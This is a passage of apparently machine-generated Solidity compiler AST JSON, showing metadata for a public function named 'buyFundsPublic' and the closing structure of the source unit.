													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 147,
												"nodeType": "ExpressionStatement",
												"src": "925:31:1"
											}
										]
									},
									"functionSelector": "f99a1f30",
									"id": 149,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "buyFundsPublic",
									"nameLocation": "893:14:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 140,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "907:2:1"
									},
									"returnParameters": {
										"id": 141,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "917:0:1"
									},
									"scope": 150,
									"src": "884:77:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 151,
							"src": "386:577:1",
							"usedErrors": []
						}
					],
					"src": "36:928:1"
				},
				"id": 1
			}
		}
	}
}